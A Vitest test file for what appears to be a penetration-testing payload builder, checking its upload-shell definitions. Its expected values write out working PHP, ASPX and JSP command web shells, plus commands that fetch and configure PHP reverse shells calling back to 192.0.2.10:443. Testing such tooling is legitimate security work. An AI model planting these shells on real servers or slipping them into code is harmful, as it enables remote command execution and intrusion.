import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { UPLOAD_SHELLS } from "../../../engines/payloads/uploadShells";

const V = { LHOST: "192.0.2.10", LPORT: "443", TARGET_IP: "198.51.100.20", UPLOAD_PATH: "uploads" };
const def = (id: string) => {
  const d = UPLOAD_SHELLS.find((x) => x.id === id);
  if (!d) throw new Error(id);
  return d;
};
const JSP = (sh: string, flag: string) =>
  `<% String c = request.getParameter("cmd"); if (c != null) { Process p = Runtime.getRuntime().exec(new String[]{"${sh}","${flag}",c}); java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); } %>`;

const EXPECTED: Record<string, { text: string; trigger: string }> = {
  "upload-php-cmd": { text: "<?php system($_REQUEST['cmd']); ?>", trigger: "http://198.51.100.20/uploads/shell.php?cmd=whoami" },
  "upload-aspx-cmd": {
    text: `<%@ Page Language="C#" %><% var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request["cmd"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>`,
    trigger: "http://198.51.100.20/uploads/shell.aspx?cmd=whoami",
  },
  "upload-jsp-cmd-linux": { text: JSP("/bin/sh", "-c"), trigger: "http://198.51.100.20/uploads/shell.jsp?cmd=whoami" },
  "upload-jsp-cmd-windows": { text: JSP("cmd.exe", "/c"), trigger: "http://198.51.100.20/uploads/shell.jsp?cmd=whoami" },
  "upload-php-pentestmonkey": {
    text: `cp /usr/share/webshells/php/php-reverse-shell.php rev.php && sed -i "s/^\\$ip = .*/\\$ip = '192.0.2.10';/; s/^\\$port = .*/\\$port = 443;/" rev.php`,
    trigger: "http://198.51.100.20/uploads/rev.php",
  },
  "upload-php-ivan-sincek": {
    text: `curl -so rev.php https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php && sed -i "s/new Shell([^)]*)/new Shell('192.0.2.10', 443)/" rev.php`,
    trigger: "http://198.51.100.20/uploads/rev.php",
  },
};

describe("UPLOAD_SHELLS", () => {
  it("covers exactly the expected defs", () => {
    expect(UPLOAD_SHELLS.map((d) => d.id).sort()).toEqual(Object.keys(EXPECTED).sort());
  });

  it("builds the exact text and trigger in uploaded-file", () => {
    for (const [id, want] of Object.entries(EXPECTED)) {
      const b = buildPayload(def(id), "uploaded-file", V);
      expect(b.text, id).toBe(want.text);
      expect(b.trigger?.text, id).toBe(want.trigger);
      expect(b.unresolved, id).toEqual([]);
      expect(b.notes, id).toContain("Saved as a file and uploaded; nothing is wrapped.");
    }
  });

  it("web shells have no listener and shape webshell; the rev shells use Kali", () => {
    for (const id of ["upload-php-cmd", "upload-aspx-cmd", "upload-jsp-cmd-linux", "upload-jsp-cmd-windows"]) {
      expect(def(id).listeners).toEqual([]);
      expect(def(id).shape).toBe("webshell");
    }
    for (const id of ["upload-php-pentestmonkey", "upload-php-ivan-sincek"]) {
      expect(def(id).upload?.kali).toBe(true);
      expect(def(id).bakesIp).toBe(true);
    }
  });

  it("the sed regexes edit the stock files' column-0 lines", () => {
    const sed = (s: string, from: string, to: string) => s.replace(new RegExp(from), to);
    expect(sed("$ip = '127.0.0.1';  // CHANGE THIS", "^\\$ip = .*", "$ip = '192.0.2.10';")).toBe("$ip = '192.0.2.10';");
    expect(sed("$sh = new Shell('127.0.0.1', 9000);", "new Shell\\([^)]*\\)", "new Shell('192.0.2.10', 443)")).toBe("$sh = new Shell('192.0.2.10', 443);");
  });

  it("trigger joins the upload path with single slashes", () => {
    const d = def("upload-php-cmd");
    const t = (p: string) => buildPayload(d, "uploaded-file", { ...V, UPLOAD_PATH: p }).trigger?.text;
    expect(t("/uploads/")).toBe("http://198.51.100.20/uploads/shell.php?cmd=whoami");
    expect(t("uploads/")).toBe("http://198.51.100.20/uploads/shell.php?cmd=whoami");
    expect(t(" /var/www/up/ ")).toBe("http://198.51.100.20/var/www/up/shell.php?cmd=whoami");
  });

  it("UPLOAD_PATH blank is unresolved in the trigger only", () => {
    const b = buildPayload(def("upload-php-cmd"), "uploaded-file", { ...V, UPLOAD_PATH: "" });
    expect(b.unresolved).toEqual([]);
    expect(b.trigger?.unresolved).toEqual(["UPLOAD_PATH"]);
  });

  it("every def has parts and a note, and every part token appears in its text", () => {
    for (const d of UPLOAD_SHELLS) {
      expect(d.parts.length, d.id).toBeGreaterThan(0);
      expect(d.notes?.length, d.id).toBeGreaterThan(0);
      const { text } = buildPayload(d, "uploaded-file", V);
      for (const p of d.parts) expect(text.includes(p.token.replace("{FILE}", d.defaults?.FILE ?? "")), `${d.id}: ${p.token}`).toBe(true);
    }
  });
});
